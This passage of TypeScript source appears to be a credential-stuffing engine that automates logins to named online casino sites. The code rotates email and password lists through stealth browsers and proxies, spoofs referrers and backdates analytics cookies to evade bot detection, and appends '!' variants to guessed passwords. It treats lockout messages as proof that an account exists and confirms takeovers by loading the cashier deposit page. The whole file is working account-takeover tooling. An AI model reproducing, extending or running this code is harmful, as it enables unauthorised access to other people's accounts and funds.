            const outcome = row.sites[t.name]?.outcome;
            if (outcome === "N/A" || outcome === "blocked") {
              fullyConclusive = false;
              row.sites[t.name]!.outcome = "queued";
            }
          }

          // Requeue logic: If not conclusive, push back to queue!
          if (!fullyConclusive && row.status !== "skipped") {
            // @ts-expect-error
            row._requeueCount++;
            row.status = "queued";
            this.log("WARN", `↩ Auto-requeueing inconclusive credential: ${row.email}`);
            queue.push(idx);
          }
        }).catch((err: any) => {
          this.log("ERROR", `Unhandled runRow exception for ${row.email}: ${err?.message || String(err)}`);
          row.status = "skipped";
        });

        activeTasks.add(task);
        void task.finally(() => activeTasks.delete(task));
      } else {
        // Wait for at least one active task to finish to see if it requeues
        await Promise.race(activeTasks);
      }
    }

    // Persist proxy reputation sidecar so quarantine state survives restarts.
    // Best-effort — failures are logged inside the tracker but never thrown.
    void proxyScoreTracker.saveScores(PROXY_SCORES_FILE);
    // Persist the misdirection denylist as well. Burns also save eagerly the
    // moment they fire (see executeLoginFlow caller) so an interrupted run
    // still keeps denylist state, but the end-of-run sweep is the canonical
    // checkpoint.
    void misdirectionDenylist.save(MISDIRECTION_DENYLIST_FILE);
    // Same defensive end-of-run sweep for the email denylist.
    await emailDenylist.saveAll();

    // Process queued AI verifications before declaring completion.
    // Post-run batch mode: all double-bad rows get AI-checked now.
    if (this.pendingVerifications.length > 0) {
      try {
        await this.runVerificationQueue(allTargets);
      } catch (err: unknown) {
        this.log("WARN", `AI verification queue error: ${(err instanceof Error ? err.message : String(err)) || String(err)}`);
      }
    }

    // ── Write experimental elimination results CSV ──────────────────────
    if (config.isExperimental && config.experimentalConfigs && config.experimentalConfigs.length > 0) {
      try {
        this.writeExperimentalResultsCsv(config.experimentalConfigs);
      } catch (err: unknown) {
        this.log("WARN", `Failed to write experimental results CSV: ${(err instanceof Error ? err.message : String(err)) || err}`);
      }
    }

    // Issue K: Drain all pooled browser sessions on engine stop to prevent
    // orphaned browser processes leaking until Node exits.
    if (workerSessionPool.size > 0) {
      this.log("INFO", `🧹 Draining ${workerSessionPool.size} pooled session(s)...`);
      for (const [slot, pooled] of workerSessionPool) {
        await safeCloseSession(pooled.handle);
        for (const row of this.rows) {
          if (pooled.handle.email && row.email === pooled.handle.email) {
            persistFinalizedSessionArtifacts(row, pooled.handle);
          }
        }
        workerSessionPool.delete(slot);
      }
    }

    this.running = false;
    this.liveLimit = null;
    clearInterval(concurrencyWatchdog);
    clearInterval(resourceWatchdog);
    this.emit("complete", { rows: this.rows });
    this.log("INFO", "═══ Automation complete ═══");
  }

  /** Gracefully stop the engine after current tasks finish */
  stop(): void {
    if (!this.running) return;
    this.shouldStop = true;
    this.tempDisabledScheduler?.stop();
    this.log("WARN", "Stop requested — finishing active sessions...");
    this.emit("stopping");
    // Unblock anything waiting on the concurrency limiter so those tasks
    // reach the shouldStop branch and exit cleanly rather than hanging.
    this.liveLimit?.shutdown();
  }

  // ─── Private ──────────────────────────────────────────────────────────────

  /** Resolve the backend for a specific row index.
   *  When splitBackends is active, even rows use [0] and odd rows use [1],
   *  so both systems run concurrently for interleaved A/B comparison. */
  private resolveBackendForRow(config: EngineConfig, rowIndex: number): EngineConfig["backend"] {
    // Backend rotation mode: round-robin across all configured backends
    if (config.backend === "rotate-backends" && config.rotateBackendsList && config.rotateBackendsList.length > 0) {
      // When rotation tracking is active, filter out eliminated backends
      let activePool = config.rotateBackendsList;
      if (config.rotationTracking && config.rotationTracking.length > 0) {
        const eliminatedSet = new Set(
          config.rotationTracking.filter(t => t.eliminated).map(t => t.backend)
        );
        activePool = config.rotateBackendsList.filter(b => !eliminatedSet.has(b));
        if (activePool.length === 0) {
          // All eliminated — fall through to first remaining backend for the report trigger
          this.log("WARN", `  🔄 [Rotate] All backends eliminated! Falling back to first backend for report generation.`);
          activePool = [config.rotateBackendsList[0]!];
        }
      }
      const backendIdx = rowIndex % activePool.length;
      const chosen = activePool[backendIdx];
      const totalActive = activePool.length;
      const totalAll = config.rotateBackendsList.length;
      this.log("INFO", `  🔄 [Rotate] row=${rowIndex} → backend=${chosen} (${backendIdx + 1}/${totalActive} active, ${totalAll} total)`);
      return chosen as EngineConfig["backend"];
    }
    if (config.splitBackends && config.splitBackends.length === 2) {
      return (rowIndex % 2 === 0 ? config.splitBackends[0] : config.splitBackends[1]) as EngineConfig["backend"];
    }
    return config.backend;
  }

  /** Pick a different backend than the one that was just fingerprinted.
   *  Falls back to the next in rotateBackendsList or cycles through
   *  the standard backend pool. */
  private pickAlternateBackend(config: EngineConfig, failedBackend: string | undefined): string {
    const pool = config.rotateBackendsList && config.rotateBackendsList.length > 1
      ? config.rotateBackendsList
      : ["stealth", "cloak-headless", "cloak-headed", "zendriver"];
    const idx = pool.indexOf(failedBackend || "");
    // Pick the next one in the list (wrapping around)
    return pool[(idx + 1) % pool.length] || pool[0] || "stealth";
  }

  /**
   * Build the password attempt sequence for a given batch.
   * Each batch uses 3 passwords from the credential's password list.
   * Batch 0: passwords[0..2], Batch 1: passwords[3..5], Batch 2: passwords[6..8], etc.
   *
   * Padding rules when a batch has fewer than 3 passwords:
   *   • 2 passwords (1 short):  [pw1, pw2, pw1!,  pw1!]
   *   • 1 password  (2 short):  [pw1, pw1!, pw1!!, pw1!!]
   *
   * The synthetic `!` / `!!` variants are appended to the first password of the
   * batch — many users append a trailing `!` when forced to rotate credentials,
   * so probing both variants gives a meaningful retry rather than spamming the
   * same wrong password three times.
   *
   * 4th attempt is always a re-press of the 3rd (buffer to trigger the
   * "temporarily disabled" response used as the account-existence heuristic).
   * Returns empty array if no passwords available for this batch.
   */
  private buildPasswordSequence(passwords: string[], batchIndex: number): string[] {
    const startIdx = batchIndex * 3;
    const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p && p.length > 0);
    if (raw.length === 0) return []; // no more passwords for this batch

    // Pad array to exactly length 4 per requirements:
    // If 3 items: [A, B, C, C] (Attempt 4 duplicates Attempt 3)
    // If 2 items: [A, B, B, B]
    // If 1 item: [A, A, A, A]
    const batch = [...raw];
    const lastValid = batch[batch.length - 1];
    if (lastValid === undefined) return [];

    while (batch.length < 4) {
      batch.push(lastValid);
    }

    return batch;
  }

  /**
   * Wait for the site to respond after a login button press.
   * Watches for page content changes, waits for networkidle + 500ms.
   * Returns the detected response type.
   *
   * Success is detected via: (a) the .ol-alert__content--status_success
   * selector appearing in the DOM, (b) the URL navigating away from the
   * /login path (post-login redirect), or (c) the login form vanishing
   * (submit button + password field both gone — site replaced the form
   * with post-login content even without a URL change).
   */
  private async waitForLoginResponse(
    page: Page,
    timeoutMs: number = 15000,
    loginUrl?: string,
    submitSelector?: string,
    passwordSelector?: string,
    siteLabel?: string,
  ): Promise<LoginResponse> {
    try {
      // Wait for DOM to load (avoids networkidle which can hang on infinite websockets)
      await page.waitForLoadState("domcontentloaded", { timeout: timeoutMs });
    } catch {
      // Timeout waiting for load — treat as timeout
      return "timeout";
    }

    // URL-change success check (post-login redirect away from /login)
    try {
      const currentUrl = page.url();
      if (loginUrl && this.isUrlChangedAwayFromLogin(loginUrl, currentUrl)) {
        // Terminal-success URL check runs FIRST so it overrides downstream
        // text-based detection (e.g. joe phone-number-reset-request contains
        // "disabled" referring to the phone number, not the account).
        if (this.isSuccessTerminalUrl(siteLabel, currentUrl)) {
          this.log("INFO", `  ✅ ${siteLabel}: terminal-success URL reached: ${currentUrl}`);
          return "success";
        }
        // PIN-update misdirection (joe + ignition): "UPDATE YOUR PIN" or
        // "PIN UPDATE" can be served as a URL redirect OR as an in-page
        // overlay. URL-only check lives in the evalResponse text scan below;
        // here we only fall through to in-page detection.
        this.log("INFO", `  → url-change success: ${loginUrl} → ${currentUrl}`);
        return "success";
      }
    } catch { /* page closed mid-check */ }

    // Read page content and look for the unique trigger words that are the
    // ONLY source of truth for non-credential outcomes. Ordering matters:
    //   1. "AUTHENTICATOR"             → terminal 2FA (joe + ignition)
    //   2. "VERIFY YOUR PHONE" / "+61"  → terminal success (joe + ignition)
    //   3. "UPDATE YOUR PIN" / "PIN UPDATE" → pin-misdirection (burn + requeue)
    //   4. "LOGIN VERIFICATION"        → Ignition-only fake popup (refresh / burn)
    //   5. existing per-credential phrases: disabled / tempdisabled / incorrect
    //
    // Phase gate: the four trigger words are ONLY consulted once the login
    // page has changed state — either the password field has been removed
    // from the DOM, OR the URL has moved off the original /login path. This
    // prevents static page chrome (header / footer / meta) that happens to
    // contain a customer-support "+61 ..." phone number or the word
    // "verification" / "authenticator" from being misread as a verdict
    // BEFORE the credential's submit has ever fired. Per-credential phrases
    // (disabled / tempdisabled / incorrect) still gate on themselves since
    // they only appear after a real auth response.
    const loginPath = (() => {
      try { return loginUrl ? new URL(loginUrl).pathname.toLowerCase() : ""; } catch { return ""; }
    })();
    const evalResponse = async (): Promise<LoginResponse> => {
      const bodyTextRaw = await page.evaluate(SHADOW_DOM_TEXT_EXTRACTOR).catch(() => "");
      const signals = await page.evaluate(
        ({ selector, submitSel, passwordSel, loginPathArg, bodyTextStr }: { selector: string, submitSel: string, passwordSel: string, loginPathArg: string, bodyTextStr: string }): LoginSignals => {
          const bodyText = bodyTextStr || "";
          const passwordPresent = passwordSel ? !!document.querySelector(passwordSel) : false;
          const currentPath = (location.pathname || "").toLowerCase();
          const urlMoved = loginPathArg ? currentPath !== loginPathArg : false;
          const hasSuccessSelector = !!document.querySelector(selector);
          // Form-vanished success requires BOTH selectors to be configured;
          // an unconfigured selector reports `submitGone = false` so the
          // classifier never reads a missing config as a positive signal.
          const submitGone = (submitSel && passwordSel) ? !document.querySelector(submitSel) : false;
          const alertPresent = !!document.querySelector('.ol-alert__content');
          const promoPresent = !!document.querySelector('.promo-modal, .modal-close, [aria-label="Close modal"]');
          return { bodyText, passwordPresent, urlMoved, hasSuccessSelector, submitGone, alertPresent, promoPresent };
        },
        {
          selector: SUCCESS_SELECTOR,
          submitSel: submitSelector || "",
          passwordSel: passwordSelector || "",
          loginPathArg: loginPath,
          bodyTextStr: bodyTextRaw as string
        }
      );
      return classifyLoginResponse(signals, siteLabel || "");
    };

    try {
      let response = await evalResponse();
      // "other" recheck: a slow redirect may still be in flight after the initial wait.
      // Poll once a second for up to 10s — return early on any non-"other" verdict
      // or when the URL changes away from /login.
      if (response === "other" && loginUrl) {
        for (let i = 0; i < 10; i++) {
          await this.sleep(1000);
          if (page.isClosed()) break;
          try {
            const cur = page.url();
            if (this.isUrlChangedAwayFromLogin(loginUrl, cur)) {
              if (this.isSuccessTerminalUrl(siteLabel, cur)) {
                this.log("INFO", `  ✅ ${siteLabel}: late terminal-success URL reached after ${i + 1}s: ${cur}`);
                return "success";
              }
              this.log("INFO", `  → late url-change success after ${i + 1}s: ${cur}`);
              return "success";
            }
          } catch { /* page closed */ }
          const recheck = await evalResponse().catch(() => null);
          if (recheck && recheck !== "other") {
            response = recheck;
            break;
          }
        }
      }

      // Unresponsive success check: If still "other" after 10s, follow up with an additional
      // click of the login button without changing credentials.
      if (response === "other" && loginUrl && submitSelector) {
        this.log("INFO", `  ${siteLabel || ""}: No response after 10s. Firing secondary submit click...`);
        try {
          const btnBox = await page.locator(submitSelector).boundingBox({ timeout: 500 }).catch(() => null);
          if (btnBox) {
            await page.mouse.click(btnBox.x + btnBox.width / 2, btnBox.y + btnBox.height / 2);
          } else {
            await page.locator(submitSelector).click({ force: true, timeout: 500 }).catch(() => { });
          }
          for (let i = 0; i < 10; i++) {
            await this.sleep(1000);
            if (page.isClosed()) break;
            const recheck = await evalResponse().catch(() => null);
            if (recheck && recheck !== "other") {
              response = recheck;
              break;
            }
          }

          // If still other, navigate to cashier to confirm successful login
          if (response === "other") {
            this.log("INFO", `  ${siteLabel || ""}: Still no response. Redirecting to cashier to confirm login...`);
            const cashierUrl = new URL(loginUrl).origin + "/account/cashier/deposit/cc";
            await page.goto(cashierUrl, { waitUntil: "domcontentloaded", timeout: 15000 }).catch(() => { });
            await this.sleep(3000); // Wait for potential bounce redirect back to login

            if (!page.isClosed()) {
              const currentUrl = page.url();
              if (currentUrl.includes("/login") || currentUrl.includes("?login=true") || currentUrl === loginUrl) {
                this.log("WARN", `  ${siteLabel || ""}: Cashier bounced back to login. Flagging for review.`);
                return "cashier-bounce";
              } else {
                this.log("INFO", `  ✅ ${siteLabel || ""}: Cashier page loaded successfully. Confirmed hidden success.`);
                return "success";
              }
            }
          }
        } catch { /* ignore page closed errors */ }
      }
      // Body-text capture when we still couldn't classify — helps diagnose missed redirects.
      if (response === "other") {
        const label = siteLabel || "?";
        let url = "<unknown>";
        try { url = page.url(); } catch { /* page closed */ }
        let body = "";
        try {
          body = (await page.evaluate(SHADOW_DOM_TEXT_EXTRACTOR));
        } catch { /* page closed or evaluate failed */ }
        const truncated = body.toLowerCase().replace(/\s+/g, " ").trim().slice(0, 500);
        this.log("WARN", `${label} Poll window expired with no verdict at ${url} — body: ${truncated}`);
      }
      return response;
    } catch {
      return "timeout";
    }
  }

  /** Navigate to `url` with up to `attempts` retries on transient errors
   *  (DNS failure, proxy CONNECT timeout, TLS reset, net::ERR_ABORTED, etc).
   *  Backs off 1s/2s/4s between attempts. Auth-credential failures are NOT
   *  retried inline — they bubble out so the row-level proxy-rotation loop
   *  can pick a fresh proxy. */
  private async gotoWithRetry(page: Page, url: string, attempts: number = 3): Promise<import("playwright-core").Response | null> {
    // 💡 Cookie Pre-Injection: Programmatically set "Cookie Notice Accepted"
    // flags to save ~4 seconds of dismissal time per site. The previous
    // implementation prefixed the page hostname (e.g. www.example.com) with
    // a leading dot — but per RFC 6265 a leading dot is no longer
    // meaningful, so Chromium normalised that to a host-only cookie scoped
    // strictly to `www.example.com`. That meant banner scripts loaded from
    // peer subdomains (cdn., static., assets.) or from the apex
    // (example.com) never saw the consent flag and re-prompted anyway.
    //
    // The fix: also emit a copy scoped to the registrable apex (last two
    // labels — covers .win, .eu and every other single-segment TLD used by
    // the current targets). Chromium will then send the cookie on every
    // subdomain GET, regardless of which host the banner script checks.
    // ── Referrer Chain Simulation (#18) ──
    // Set a plausible Referer header: real users arrive from Google, bookmarks, or the homepage
    try {
      const urlObj = new URL(url);
      const refRoll = Math.random();
      let referer: string;
      if (refRoll < 0.60) {
        // 60% — Google search referrer
        referer = `https://www.google.com/search?q=${encodeURIComponent(urlObj.hostname)}`;
      } else if (refRoll < 0.80) {
        // 20% — Direct (no referrer — bookmark or typed URL)
        referer = "";
      } else if (refRoll < 0.95) {
        // 15% — Site's own homepage
        referer = urlObj.origin + "/";
      } else {
        // 5% — Social media
        const socials = ["https://www.facebook.com/", "https://t.co/", "https://www.reddit.com/"];
        referer = socials[Math.floor(Math.random() * socials.length)]!;
      }
      if (referer) {
        await page.setExtraHTTPHeaders({ "Referer": referer });
      }
    } catch { /* non-critical */ }

    try {
      const hostname = new URL(url).hostname;
      const parts = hostname.split(".").filter(Boolean);
      const apex = parts.length >= 2 ? parts.slice(-2).join(".") : hostname;
      const scopes = new Set<string>();
      // Host-only cookie for the requested subdomain (e.g. www.example.com)
      scopes.add(hostname);
      // Apex/registrable-domain cookie that's also sent on every subdomain
      // (Chromium auto-prepends the leading dot for non-host-only cookies)
      scopes.add(`.${apex}`);
      const recipes = [
        { name: 'notice_gdpr_prefs', value: '0,1,2:' },
        { name: 'notice_preferences', value: '2:' },
        { name: 'cookie_consent_accepted', value: 'true' },
        { name: 'optanon_consent', value: 'isGpcEnabled=0&datacenters=1&groups=C0001:1,C0002:1,C0003:1,C0004:1' },
        { name: 'trustarc_cookie_consent', value: '{"cm_allowed":"all","cm_date":"2024-01-01T00:00:00.000Z"}' },
        { name: 'cookie-preferences', value: '{"analytics":true,"marketing":true}' },
        { name: 'accepted_cookies', value: 'true' },
      ];

      // ── Session Cookie Aging (#16) — inject realistic analytics cookies ──
      const now = Date.now();
      const ageDays = 1 + Math.floor(Math.random() * 6); // 1-7 days old
      const gaTimestamp = Math.floor((now - ageDays * 86400000) / 1000);
      const gaId = `GA1.2.${Math.floor(Math.random() * 2000000000)}.${gaTimestamp}`;
      const gidId = `GA1.2.${Math.floor(Math.random() * 2000000000)}.${Math.floor(now / 1000)}`;
      const agedCookies = [
        { name: '_ga', value: gaId },
        { name: '_gid', value: gidId },
        { name: '_gat', value: '1' },
      ];

      const cookies = [];
      for (const domain of scopes) {
        for (const r of recipes) cookies.push({ ...r, domain, path: '/' });
        for (const r of agedCookies) cookies.push({ ...r, domain, path: '/' });
      }
      await page.context().addCookies(cookies);
    } catch { /* ignore invalid url */ }

    let lastErr: any = null;
    for (let i = 1; i <= attempts; i++) {
      try {
        // Blueprint: Dual-Phase Page Load Watchdog (Spec 4)
        if (i === 1) {
          try {
            const res = await page.goto(url, { waitUntil: "domcontentloaded", timeout: 20000 });
            await page.waitForLoadState("networkidle", { timeout: 5000 }).catch(() => {});
            return res;
          } catch (e: unknown) {
            const msg = ((e instanceof Error ? e.message : String(e)) || String(e)).toLowerCase();
            if (msg.includes("err_invalid_auth_credentials") || msg.includes("err_proxy_auth") ||
              msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
              msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
              msg.includes("err_name_not_resolved")) {
              throw new PreemptiveBlockError((e instanceof Error ? e.message : String(e)));
            }
            if (msg.includes("timeout")) {
              this.log("WARN", `  Phase 1 Watchdog triggered, executing Phase 2 reload...`);
              const res = await page.reload({ waitUntil: "domcontentloaded", timeout: 30000 });
              await page.waitForLoadState("networkidle", { timeout: 5000 }).catch(() => {});
              return res;
            }
            throw e;
          }
        }
        const res = await page.goto(url, { waitUntil: "domcontentloaded", timeout: 30000 });
        await page.waitForLoadState("networkidle", { timeout: 5000 }).catch(() => {});
        return res;
      } catch (e: unknown) {
        lastErr = e;
        const msg = ((e instanceof Error ? e.message : String(e)) || String(e)).toLowerCase();
        if (msg.includes("err_invalid_auth_credentials") || msg.includes("err_proxy_auth") ||
          msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
          msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
          msg.includes("err_connection_timed_out") || msg.includes("timeout") || msg.includes("err_name_not_resolved")) {
          throw new PreemptiveBlockError((e instanceof Error ? e.message : String(e)));
        }
        if (i === attempts) break;
        const backoffMs = DynamicTimings.GOTO_RETRY_BASE * Math.pow(2, i - 1);
        this.log("WARN", `  goto retry ${i}/${attempts} after ${backoffMs}ms: ${msg.substring(0, 80)}`);
        await this.sleep(backoffMs);
      }
    }
    throw lastErr;
  }

  /** Navigate to `url` with fallback support. If the primary URL fails,
   *  it iterates through `fallbackUrls`. Returns the successful origin and response so
   *  subsequent flows (like verifyUrl) can stay on the same domain. */
  private async gotoWithFallback(page: Page, site: SiteConfig, attempts: number = DynamicTimings.GOTO_RETRY_ATTEMPTS): Promise<{ origin: string, response: import("playwright-core").Response | null }> {
    const urls = [site.url, ...(site.fallbackUrls || [])];
    let lastErr: any = null;
    for (const url of urls) {
      try {
        const response = await this.gotoWithRetry(page, url, attempts);
        const origin = new URL(url).origin;
        this.log("INFO", `  Loaded ${origin}`);
        return { origin, response };
      } catch (e: unknown) {
        lastErr = e;
        const msg = ((e instanceof Error ? e.message : String(e)) || String(e)).toLowerCase();
        // If it's a proxy/connection error, don't waste time trying fallback URLs
        // because the proxy itself is dead, not the target domain.
        if (msg.includes("err_invalid_auth_credentials") || msg.includes("err_proxy_auth") ||
          msg.includes("err_proxy_connection_failed") || msg.includes("err_connection_refused") ||
          msg.includes("err_empty_response") || msg.includes("err_connection_closed") ||
          msg.includes("err_connection_timed_out") || msg.includes("timeout") || msg.includes("err_name_not_resolved")) {
          throw new PreemptiveBlockError((e instanceof Error ? e.message : String(e)));
        }
        this.log("WARN", `  Failed to load ${url}, falling back...`);
      }
    }
    throw lastErr;
  }
  /** True if the post-submit URL is no longer on the login page (counts as success). */
  private isUrlChangedAwayFromLogin(loginUrl: string, currentUrl: string): boolean {
    try {
      const loginPath = new URL(loginUrl).pathname.toLowerCase();
      const curUrl = new URL(currentUrl);
      const curPath = curUrl.pathname.toLowerCase();
      // Same path → no redirect; different path that doesn't contain "login" → success
      if (curPath === loginPath) return false;
      if (curPath.includes("login") || curPath.includes("signin") || curPath.includes("sign-in")) return false;
      return true;
    } catch {
      return false;
    }
  }

  /**
   * True if the post-login URL is a known terminal-success page that can
   * only be reached by an authenticated session, even if in-page text or a
   * network response would otherwise classify the response as disabled /
   * incorrect / other. Authoritative evidence of login success — overrides
   * downstream text-based detection.
   *
   * Currently recognises:
   *   joe → `/phone-number-reset-request` — JoeFortune lands accounts here
   *   when the registered phone number needs re-verification. The page is
   *   gated behind authentication; reaching it confirms the credential is
   *   valid even when the page body contains the word "disabled" (referring
   *   to the disabled phone number, not the account).
   */
  private isSuccessTerminalUrl(siteName: string | undefined, currentUrl: string): boolean {
    try {
      const path = new URL(currentUrl).pathname.toLowerCase();
      if (siteName === "joe" && path.includes("phone-number-reset-request")) return true;
      return false;
    } catch {
      return false;
    }
  }

  /** True when a login submit redirected to the same site's public/home root. */
  private isMainPageRedirectAfterLogin(loginUrl: string, currentUrl: string): boolean {
    try {
      const login = new URL(loginUrl);
      const current = new URL(currentUrl);
      if (login.hostname.toLowerCase() !== current.hostname.toLowerCase()) return false;
      const loginPath = login.pathname.replace(/\/+$/, "").toLowerCase() || "/";
      const currentPath = current.pathname.replace(/\/+$/, "").toLowerCase() || "/";
      if (currentPath !== "/") return false;
      return loginPath !== "/" && !currentPath.includes("login") && !currentPath.includes("signin") && !currentPath.includes("sign-in");
    } catch {
      return false;
    }
  }

  /**
   * If a submit landed on the site's public root, immediately navigate to the
   * cashier/verify URL. Root redirects are not trusted as success by themselves:
   * cashier reachability is the confirmation signal.
   */
  private async confirmRootRedirectViaCashier(page: Page, site: SiteConfig, attemptLabel: string): Promise<"success" | "unconfirmed" | undefined> {
    if (!site.verifyUrl) return undefined;
    const currentUrl = page.url();
    if (!this.isMainPageRedirectAfterLogin(site.url, currentUrl)) return undefined;

    this.log("INFO", `  ${site.name}: root-page redirect after ${attemptLabel} (${currentUrl}) — immediately verifying via cashier`);
    const verified = await this.performCashierVerification(page, site);
    if (verified === "success") return "success";
    this.log("WARN", `  ${site.name}: root-page redirect was not cashier-confirmed — continuing login attempts`);
    return "unconfirmed";
  }

  /**
   * Robust fill for SpiderPage: mirrors inputText()'s verify-and-retry pattern.
   * Returns true when the field value matches after filling, false if all
   * escalation passes fail (caller should abort the submit).
   *
   * Escalation order:
   *   1. sp.fill() → evaluate read-back
   *   2. Native setter clear + sp.fill() → read-back
   *   3. Character-by-character injection via evaluate → read-back
   */
  private async spiderCloudFill(sp: any, selector: string, value: string): Promise<boolean> {
    const readBack = async (): Promise<string | undefined> => {
      try {
        const v = await sp.evaluate(`
          (() => {
            const el = document.querySelector('${selector.replace(/'/g, "\\'")}');
            return el ? (el.value || '') : '';
          })();
        `);
        return String(v ?? "");
      } catch { return undefined; }
    };

    const driver: CredentialFieldDriver = {
      readValue: async (_sel: string) => {
        await this.sleep(50);
        return await readBack();
      },
      repairPlan: (val: string) => [
        {
          run: async (sel: string) => {
            try {
              await sp.fill(sel, val, { force: true });
            } catch (e: unknown) {
              this.log("WARN", `  spiderCloudFill pass 1 failed on ${sel}: ${e instanceof Error ? e.message : String(e)}`);
            }
          }
        },
        {
          run: async (sel: string) => {
            try {
              await sp.evaluate(`
                (() => {
                  const el = document.querySelector('${sel.replace(/'/g, "\\'")}');
                  if (!el) return;
                  const proto = el instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
                  const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
                  setter?.call(el, '');
                  el.dispatchEvent(new Event('input', { bubbles: true }));
                  el.dispatchEvent(new Event('change', { bubbles: true }));
                })();
              `).catch(() => { });
              await this.sleep(30);
              await sp.fill(sel, val, { force: true });
            } catch (e: unknown) {
              this.log("WARN", `  spiderCloudFill pass 2 failed on ${sel}: ${e instanceof Error ? e.message : String(e)}`);
            }
          }
        },
        {
          run: async (sel: string) => {
            try {
              await sp.evaluate(`
                (() => {
                  const el = document.querySelector('${sel.replace(/'/g, "\\'")}');
                  if (!el) return;
                  el.focus();
                  const proto = el instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
                  const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
                  setter?.call(el, '');
                  el.dispatchEvent(new Event('input', { bubbles: true }));
                  setter?.call(el, ${JSON.stringify(val)});
                  el.dispatchEvent(new Event('input', { bubbles: true }));
                  el.dispatchEvent(new Event('change', { bubbles: true }));
                })();
              `);
            } catch (e: unknown) {
              this.log("WARN", `  spiderCloudFill pass 3 failed on ${sel}: ${e instanceof Error ? e.message : String(e)}`);
            }
          }
        }
      ],
      // eslint-disable-next-line @typescript-eslint/require-await
      shouldAbort: async () => false
    };

    const success = await this.repairCredentialField(driver, selector, value);
    if (!success) {
      this.log("WARN", `  ⚠ spiderCloudFill: all passes failed on ${selector} — aborting submit for this attempt`);
    }
    return success;
  }

  /**
   * Execute the login flow using the spider-browser SDK's native SpiderPage.
   * Mirrors the Playwright-based flow but uses the SDK's fill/click/evaluate/goto
   * methods. The SDK handles stealth, CAPTCHA solving, and smart retry internally.
   */
  private async executeSpidernewFlow(
    site: SiteConfig,
    cred: Credential,
    handle: SessionHandle,
    isSessionReused: boolean = false
  ): Promise<LoginFlowResult> {
    const sp = handle.spiderPage!;
    const spiderBrowser = handle.spiderBrowser!;

    const passwords = this.buildPasswordSequence(cred.passwords, 0);
    if (passwords.length === 0) {
      this.log("WARN", `  ${site.name}: no passwords available for spider-cloud flow`);
      return { outcome: "skipped", attempts: 0, reason: "no-creds" };
    }

    try {
      // ── Navigate to login page (with smart retry + CAPTCHA solving handled by SDK) ──
      this.log("INFO", `  ${site.name}: spider-cloud navigating to ${site.url}`);
      await spiderBrowser.goto(site.url);
      await sp.waitForReady(10000).catch(() => { });
      this.log("INFO", `  ${site.name}: page loaded, ready for interaction`);

      // ── Behavioral emulation: random scroll + pause ──
      if (!isSessionReused) {
        await sp.scrollY(100 + Math.floor(Math.random() * 200)).catch(() => { });
        await this.pace(Math.round(gaussianClamped(350, 120, 150, 600)));
        await sp.scrollY(-(50 + Math.floor(Math.random() * 100))).catch(() => { });
        await this.pace(Math.round(gaussianClamped(200, 80, 80, 400)));
      }

      // ── Ultra-robust cookie banner dismissal ──────────────────────────────
      // Joe Fortune and Ignition use a custom `ol-` component library with
      // unique, one-of-a-kind selectors. Banners can appear anywhere from
      // 0 to 5+ seconds after page load. Strategy:
      //   1. Pre-inject consent cookies via document.cookie to suppress banners
      //   2. Install a MutationObserver that auto-clicks the accept button
      //      the instant it appears in the DOM
      //   3. Poll for up to 5 seconds as a fallback for banners that the
      //      observer misses (e.g. if mounted before observer installs)
      if (!isSessionReused) {
        await sp.evaluate(`
          (() => {
            // ── Phase 1: Pre-inject consent cookies ──
            try {
              const cookies = [
                'notice_gdpr_prefs=0,1,2:',
                'notice_preferences=2:',
                'cookie_consent_accepted=true',
                'accepted_cookies=true',
                'cookie-preferences={"analytics":true,"marketing":true}'
              ];
              const hostname = window.location.hostname;
              const apex = hostname.replace(/^www\\./, "");
              cookies.forEach(c => {
                document.cookie = c + ';path=/;max-age=31536000';
                if (hostname !== apex) {
                  document.cookie = c + ';domain=.' + apex + ';path=/;max-age=31536000';
                }
              });
            } catch { /* intentional */ }

            // ── Phase 2: Visibility check ──
            const isVis = (el) => {
              if (!el) return false;
              try {
                const r = el.getBoundingClientRect();
                if (r.width <= 0 || r.height <= 0) return false;
                const s = getComputedStyle(el);
                if (s.display === 'none' || s.visibility === 'hidden') return false;
                if (parseFloat(s.opacity || '1') === 0) return false;
                return true;
              } catch { return false; }
            };

            // ── Phase 3: Site-specific + generic dismiss logic ──
            const tryDismiss = () => {
              if (window.__cookieBannerDismissed) return true;

              // Strategy 0: Native CMP API (CookieInformation) — zero-cost call
              try {
                if (typeof window.CookieInformation !== 'undefined' && window.CookieInformation.submitAllCategories) {
                  window.CookieInformation.submitAllCategories();
                  window.__cookieBannerDismissed = true;
                  return true;
                }
              } catch { /* intentional */ }

              // Strategy A: Text-content match on ALL visible buttons/anchors.
              const textTargets = ['accept all', 'accept cookies', 'i agree', 'agree', 'allow all', 'got it'];
              const clickables = document.querySelectorAll('button, a, [role="button"], span[class*="button"], div[class*="button"]');
              for (const phrase of textTargets) {
                for (const el of clickables) {
                  if (!isVis(el)) continue;
                  const txt = (el.textContent || '').trim().toLowerCase();
                  if (txt === phrase || txt.startsWith(phrase)) {
                    try { el.click(); window.__cookieBannerDismissed = true; return true; } catch { /* intentional */ }
                  }
                }
              }

              // Strategy B: Site-calibrated CSS selectors for Joe/Ignition.
              const cssSelectors = [
                '.ol-cookie-notice button',
                '.ol-modal button',
                '.ol-popup button',
                '.ol-notification button',
                '[class*="cookie"] button',
                '[class*="Cookie"] button',
                '[class*="consent"] button',
                '[class*="Consent"] button',
                '.coi-banner__accept',
                '.coi-banner__close',
                'button[class*="cookie"]',
                'button[class*="banner"]',
                '[class*="privacy"] button',
                '[class*="Privacy"] button',
                '[class*="notice"] button',
                '[class*="Notice"] button',
                '[class*="banner"] button',
                '[class*="Banner"] button',
                '[class*="overlay"] button',
                '[class*="gdpr"] button',
                '[id*="cookie"] button',
                '[id*="consent"] button',
                '[id*="gdpr"] button',
                '#onetrust-accept-btn-handler',
                '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
                '#cookie-accept',
                '#accept-cookies',
                '[data-action="accept"]',
                '[data-cookie-accept]',
                'button[class*="accept"]',
                'button[class*="Accept"]',
                'button[id*="accept"]',
                'button[id*="Accept"]',
                'a[class*="accept"]',
                'a[id*="accept"]',
              ];
